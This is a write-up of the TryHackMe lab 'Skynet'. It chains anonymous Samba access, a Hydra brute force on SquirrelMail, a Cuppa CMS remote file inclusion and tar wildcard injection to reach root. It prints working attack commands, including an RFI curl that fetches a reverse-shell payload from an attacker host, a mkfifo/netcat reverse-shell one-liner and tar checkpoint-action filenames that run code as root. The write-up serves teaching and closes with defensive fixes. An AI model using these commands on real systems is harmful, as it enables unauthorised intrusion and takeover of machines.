---
title: "Skynet"
date: 2026-05-10
platform: TryHackMe
difficulty: Medium
category: offensive
summary: "Anonymous Samba leaks a custom wordlist, Hydra against SquirrelMail recovers a password, an email exposes the SMB password, and a Cuppa CMS RFI plus tar wildcard injection in a root cron ends at root."
---

## Overview

Skynet is a medium-difficulty TryHackMe room that stitches five different small findings into a complete compromise. Each individual issue looks like a low-severity hygiene problem. **The total is full root**, and that gap between *individual severity* and *chain severity* is the whole skill of attack-path thinking.

The chain in this room is: anonymous Samba access leaks a password wordlist, Hydra uses it against SquirrelMail, the recovered webmail account contains an automated password-reset email, the new password unlocks a personal Samba share with a hidden URL hint, that URL points at an unmaintained Cuppa CMS install, the CMS has a public Remote File Inclusion CVE that lands a www-data shell, and a tar wildcard injection in a root cron job finishes the box.

## Tools Used

- **nmap** for port scanning and service version detection.
- **gobuster** for directory brute force against the web root.
- **enum4linux** for SMB user enumeration over null sessions.
- **smbclient** for browsing accessible shares.
- **hydra** for brute force against the SquirrelMail web login.
- **Firefox** for SquirrelMail interaction.
- **searchsploit** for matching a CMS version against known CVEs.
- **pentestmonkey php-reverse-shell** as the payload for the RFI.
- **python3 -m http.server** to host the payload.
- **netcat** to catch the callback.

## Methodology

**Step 1 - Enumerate every service.** Six open ports surface: SSH, HTTP, POP3, IMAP, and two Samba ports. The hostname *SKYNET* with workgroup *WORKGROUP* says Linux box impersonating a Windows-style file server.

```bash
nmap -p- -sV <TARGET_IP>
```

The `-p-` flag scans all 65535 TCP ports (default is only 1000). `-sV` does service version detection. Both matter because real services often hide on non-standard ports.

**Step 2 - Discover the web app layout.** A gobuster directory brute force surfaces */squirrelmail/* (a PHP webmail front-end) and the usual *css/js/images* paths.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

The version banner at the top of the SquirrelMail login page (*SquirrelMail version 1.4.23 [SVN]*) is a free fingerprint to use later.

**Step 3 - Get a real username for free.** enum4linux can enumerate user accounts over an anonymous SMB session by walking through Security Identifiers (SIDs) and resolving them to names. This is the single most useful unauthenticated technique against any open Samba port.

```bash
enum4linux -U <TARGET_IP>
```

A valid local user (let's call them *user-X*) appears in the output.

**Step 4 - Read the anonymous Samba share.** The Samba server allows full anonymous access to a share. Inside is an *attention.txt* note (fake operator memo) and a *logs* directory that contains files that look like server logs but are actually a *password wordlist* of every variant the named user has ever used.

```bash
smbclient //<TARGET_IP>/anonymous
```

The wordlist itself is the loot. It is a tiny, user-specific dictionary that will land password hits much faster than rockyou.txt.

**Step 5 - Brute force SquirrelMail with the recovered wordlist.** SquirrelMail's login form posts *login_username* and *secretkey* to */src/redirect.php*. Hydra is told which fields are which and what the failure-text marker looks like.

```bash
hydra -l <username> -P log1.txt <TARGET_IP> http-post-form \
  "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
```

`-l` is the single username. `-P` is the password wordlist. The failure marker after the final colon is the literal text Hydra sees on a wrong-password response.

**Step 6 - Pivot through the mailbox.** The recovered SquirrelMail account contains an automated *"Samba Password reset"* email with a new password for the user's personal SMB share. This is the textbook *"compromise the inbox, compromise every account whose reset flow lands there"* pattern.

**Step 7 - Find a hidden URL in the personal share.** Logging into the user's private Samba share with the password from the email reveals a *notes* directory with a personal to-do list. One item leaks the URL of a *beta CMS* sitting behind a random-string path. **This is security through obscurity**, which holds for exactly as long as nobody writes the path down anywhere readable.

**Step 8 - Identify and exploit Cuppa CMS.** A second gobuster pass inside the hidden directory finds */administrator*. The login panel is **Cuppa CMS**. searchsploit returns a single public exploit.

```bash
searchsploit cuppa cms
```

The bug is **CVE-2018-16763**, an unauthenticated Remote File Inclusion in */alertConfigField.php*. The *urlConfig* query parameter is concatenated directly into a PHP `include()` call with no allow-list, no path sanitization, no authentication. Pointing it at an attacker-controlled URL causes PHP to fetch and execute that URL as code.

```bash
# host the payload locally
python3 -m http.server 80
# in another terminal, listener
nc -lvnp 4444
# trigger via browser or curl
curl "http://<TARGET_IP>/<hidden_path>/administrator/alerts/alertConfigField.php?urlConfig=http://<KALI_IP>/php-reverse-shell.php"
```

A reverse shell lands as **www-data**.

**Step 9 - Find the privesc.** Enumerating cron and writable paths shows a root-owned script that runs every minute and does roughly:

```bash
cd /var/www/html && tar -czf /var/backups/backup.tgz *
```

The `*` is a shell *wildcard*, which the shell expands into the literal list of filenames in that directory before tar ever sees it. **tar parses arguments starting with `--` as command-line flags, not filenames.**

**Step 10 - Tar wildcard injection.** Creating two empty files in the wildcard directory whose *names* are valid tar flags, plus a real shell script, tricks the next cron tick into running attacker code as root.

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 5555 >/tmp/f' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

When cron fires, the shell expands the wildcard, tar treats *--checkpoint-action=exec=sh shell.sh* as a real flag, and shell.sh runs as root.

## Key Takeaways

- **Chain thinking beats CVE thinking.** Five small findings, none individually critical, made the room. Real engagements look like this.
- **enum4linux is the right first move against any open Samba port.** SID-to-username resolution converts every downstream auth step from a two-axis brute force into a one-axis one.
- **A wordlist on disk is sometimes the loot itself.** Read every file on every accessible share, even the ones that look operational rather than sensitive.
- **Mailbox compromise is account compromise.** Every account whose reset flow lands in the mailbox is now yours.
- **Wildcards on the command line of a tool that interprets dashes are a privesc primitive.** Audit cron and systemd timers for any glob touching a service-writable path.

## What a Defender Should Do

- Disable anonymous SMB (`map to guest = never`) and never store credential material on any share.
- Never archive plaintext password rotation history. If audit history is required for compliance, store one-way hashes.
- Stop sending credentials by email. Send a one-time, time-boxed reset link that requires the user to set a new password on a TLS-protected endpoint.
- Put pre-production CMS paths behind real authentication, basic auth at minimum.
- Remove or replace unmaintained CMS software. Cuppa CMS is effectively abandoned. Set `allow_url_include = Off` in php.ini.
- Fix tar wildcard exposure with `tar czf backup.tgz -- *` (the `--` end-of-options marker) or replace the glob with `find ... -print0 | xargs -0 tar`.
